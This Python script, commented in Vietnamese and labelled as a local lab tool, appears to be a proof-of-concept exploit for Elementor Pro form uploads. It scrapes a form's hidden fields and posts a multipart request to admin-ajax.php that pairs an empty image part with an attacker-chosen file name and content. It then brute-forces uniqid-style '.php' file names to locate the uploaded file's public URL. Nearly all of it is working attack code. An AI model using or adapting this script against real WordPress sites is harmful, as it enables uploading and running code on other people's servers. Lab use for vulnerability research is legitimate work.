#!/usr/bin/env python3

import sys
from datetime import datetime, timedelta
from pathlib import Path
from urllib.parse import urlparse

import requests
from bs4 import BeautifulSoup


USER_AGENT = (
    "Mozilla/5.0 (X11; Linux x86_64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/133.0.0.0 Safari/537.36"
)


def parse_date(value):
    return datetime.strptime(value, "%d/%m/%Y")


def get_form(session, page_url):
    r = session.get(
        page_url,
        headers={"User-Agent": USER_AGENT},
        timeout=15,
    )
    r.raise_for_status()

    soup = BeautifulSoup(r.text, "html.parser")
    form = soup.select_one("form.elementor-form")

    if not form:
        raise RuntimeError("Không tìm thấy form.elementor-form")

    return form


def get_field(form, name):
    element = form.select_one(f'[name="{name}"]')
    if not element:
        return ""
    return element.get("value", "")


def parse_elementor_form(form):
    file_input = form.select_one('input[type="file"][name]')

    if not file_input:
        raise RuntimeError("Không tìm thấy input[type=file]")

    info = {
        "post_id": get_field(form, "post_id"),
        "form_id": get_field(form, "form_id"),
        "referer_title": get_field(form, "referer_title"),
        "queried_id": get_field(form, "queried_id"),
        "upload_field": file_input["name"],
    }

    print("\n[+] Elementor form")
    for k, v in info.items():
        print(f"    {k}: {v}")

    return info


def get_ajax_url(page_url):
    parsed = urlparse(page_url)
    path = parsed.path.rstrip("/")

    # /wordpress/2026/08/20/xxxx
    parts = path.split("/")

    # Tìm segment năm YYYY
    year_index = None
    for i, part in enumerate(parts):
        if len(part) == 4 and part.isdigit():
            year_index = i
            break

    if year_index is not None:
        wp_path = "/".join(parts[:year_index])
    else:
        # Fallback: lấy path trước 4 segment cuối
        wp_path = "/".join(parts[:-4])

    if not wp_path:
        wp_path = ""

    return (
        f"{parsed.scheme}://{parsed.netloc}"
        f"{wp_path}/wp-admin/admin-ajax.php"
    )


def upload_file(session, page_url, info,
                filename="test.txt",
                content=b"aaaa"):
    ajax_url = get_ajax_url(page_url)

    data = [
        ("post_id", info["post_id"]),
        ("form_id", info["form_id"]),
        ("referer_title", info["referer_title"]),
        ("queried_id", info["queried_id"]),
        ("form_fields[name]", "x"),
        ("form_fields[email]", "a@a.com"),
        ("form_fields[message]", "x"),
        ("action", "elementor_pro_forms_send_form"),
        ("referrer", page_url),
    ]

    # Giữ [] theo request multipart bạn đã capture.
    upload_name = info["upload_field"] + "[]"

    files = [
        (
            upload_name,
            ("", b"", "image/png"),
        ),
        (
            upload_name,
            (filename, content, "text/plain"),
        ),
    ]

    parsed = urlparse(page_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"

    headers = {
        "User-Agent": USER_AGENT,
        "X-Requested-With": "XMLHttpRequest",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Origin": origin,
        "Referer": page_url,
    }

    print("\n[*] POST:", ajax_url)

    response = session.post(
        ajax_url,
        data=data,
        files=files,
        headers=headers,
        timeout=30,
    )

    print("[+] HTTP:", response.status_code)
    print("[+] Response:")
    print(response.text)

    return response


def php_uniqid_like_candidates(timestamp):
    """
    Candidate generator dùng cho LOCAL LAB.

    Lưu ý: đây là approximation để nghiên cứu filename
    timestamp-derived; không phải implementation PHP chính xác
    cho mọi PHP version/build.
    """
    timestamp_hex = f"{timestamp:08x}"

    for usec in range(0x100000):
        yield timestamp_hex + f"{usec:05x}"


def brute_force_local(
    local_upload_dir,
    public_upload_url,
    start_dt,
    end_dt,
):
    directory = Path(local_upload_dir)

    if not directory.is_dir():
        raise RuntimeError(
            f"Upload directory không tồn tại: {directory}"
        )

    print("\n" + "=" * 70)
    print("LOCAL FILESYSTEM VERIFICATION")
    print("=" * 70)
    print("[+] Directory:", directory)
    print("[+] Start:", start_dt)
    print("[+] End:", end_dt)

    current = start_dt
    seconds_done = 0

    while current <= end_dt:
        print(current)

        timestamp = int(current.timestamp())

        for file_name in php_uniqid_like_candidates(timestamp):
            filename = file_name + ".php"
            local_file = directory / filename

            

            if local_file.is_file():
                public_url = (
                    public_upload_url.rstrip("/")
                    + "/"
                    + filename
                )

                print("\n\n[+] FOUND")
                print("[+] File name:", filename)
                print("[+] Local:", local_file)
                print("[+] URL:", public_url)

                return public_url

        seconds_done += 1

        if seconds_done % 60 == 0:
            print(
                f"\r[*] Scanned until "
                f"{current.strftime('%d/%m/%Y %H:%M:%S')}",
                end="",
                flush=True,
            )

        current += timedelta(seconds=1)

    print("\n[-] Không tìm thấy candidate.")
    return None


def main():
    print("=" * 70)
    print("ELEMENTOR LOCAL LAB - FORM + UPLOAD + LOCAL VERIFICATION")
    print("=" * 70)

    base_url = input(
        "\nBase URL "
        "(http://localhost/Wordpress/wordpress): "
    ).strip().rstrip("/")

    path_form = input(
        "path_form (/2026/08/20/xxxx/): "
    ).strip()

    start_input = input(
        "Ngày bắt đầu (DD/MM/YYYY): "
    ).strip()

    end_input = input(
        "Ngày kết thúc (DD/MM/YYYY): "
    ).strip()

    try:
        start_day = parse_date(start_input)
        end_day = parse_date(end_input)
    except ValueError:
        print("[-] Sai định dạng ngày. Ví dụ: 19/08/2026")
        sys.exit(1)

    if end_day < start_day:
        print("[-] Ngày kết thúc phải >= ngày bắt đầu.")
        sys.exit(1)

    start_dt = start_day.replace(
        hour=19, minute=1, second=50, microsecond=0
    )

    end_dt = end_day.replace(
        hour=19, minute=2, second=0, microsecond=0
    )

    page_url = (
        base_url
        + "/"
        + path_form.lstrip("/")
    )

    # Tự suy ra filesystem từ base URL.
    # Với XAMPP Kali mặc định:
    #   http://localhost/Wordpress/wordpress
    # ->
    #   /opt/lampp/htdocs/Wordpress/wordpress
    parsed = urlparse(base_url)

    web_path = parsed.path.strip("/")
    local_wp_path = Path("/opt/lampp/htdocs") / web_path

    local_upload_dir = (
        local_wp_path
        / "wp-content"
        / "uploads"
        / "elementor"
        / "forms"
    )

    public_upload_url = (
        base_url
        + "/wp-content/uploads/elementor/forms"
    )

    print("\n[+] Page URL:", page_url)
    print("[+] Local WP:", local_wp_path)
    print("[+] Upload dir:", local_upload_dir)
    print("[+] Upload URL:", public_upload_url)
    print("[+] Range:", start_dt, "->", end_dt)

    session = requests.Session()

    # --------------------------------------------------------
    # 1. GET + parse Elementor form
    # --------------------------------------------------------
    try:
        form = get_form(session, page_url)
        info = parse_elementor_form(form)
    except Exception as e:
        print("[-] Form error:", e)
        sys.exit(1)

    # --------------------------------------------------------
    # 2. Upload test file
    # --------------------------------------------------------
    filename = input(
        "\nTên file test [test.txt]: "
    ).strip() or "test.txt"

    content = input(
        "Nội dung file [aaaa]: "
    )
    if content == "":
        content = "aaaa"

    try:
        response = upload_file(
            session,
            page_url,
            info,
            filename=filename,
            content=content.encode(),
        )
    except Exception as e:
        print("[-] Upload error:", e)
        sys.exit(1)

    if response.status_code < 200 or response.status_code >= 300:
        print("[-] Upload request không thành công.")
        sys.exit(1)

    # --------------------------------------------------------
    # 3. Local filename verification
    # --------------------------------------------------------
    answer = input(
        "\nDò filename trên filesystem local? [y/N]: "
    ).strip().lower()

    if answer != "y":
        print("[*] Done.")
        return

    try:
        brute_force_local(
            local_upload_dir,
            public_upload_url,
            start_dt,
            end_dt,
        )
    except Exception as e:
        print("[-] Verification error:", e)
        sys.exit(1)


if __name__ == "__main__":
    main()